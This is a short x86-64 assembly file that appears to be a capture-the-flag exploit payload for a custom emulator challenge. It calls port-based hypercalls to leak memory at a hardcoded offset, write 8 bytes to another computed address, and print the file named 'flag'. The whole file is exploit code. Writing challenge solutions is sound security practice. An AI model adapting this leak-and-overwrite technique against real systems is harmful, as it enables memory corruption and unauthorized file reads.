[bits 64]

entry:
  lea rdi, [rel leak_sign]
  call println
  mov rdi, -0x88b00-34-0x54de+0x2040
  call println

  lea rdi, [rel read_sign]
  call println
  mov rdi, -0x88b00-34-0x54de+0x2170
  mov rsi, 8
  call read_buf

  lea rdi, [rel flag]
  call do_cat

  call exit

readme:
  db 'README.md',0
flag:
  db 'flag',0
read_sign:
  db 'read:',0
leak_sign:
  db 'leak:',0
dig_stack:
  mov rax, [rsp+rdi*8]
  ret
print_hex:
  mov rax, rdi
  mov rdi, 0x62
  out dx, al
  ret
read_buf:
  mov rax, rdi
  mov rdi, 0x63
  out dx, al
  ret
println:
  mov rax, rdi
  mov rdi, 0x64
  out dx, al
  ret
do_cat:
  mov rax, rdi
  mov rdi, 0x66
  out dx, al
  ret
exit:
  mov edx, 0x0c
  int 0x80
  hlt
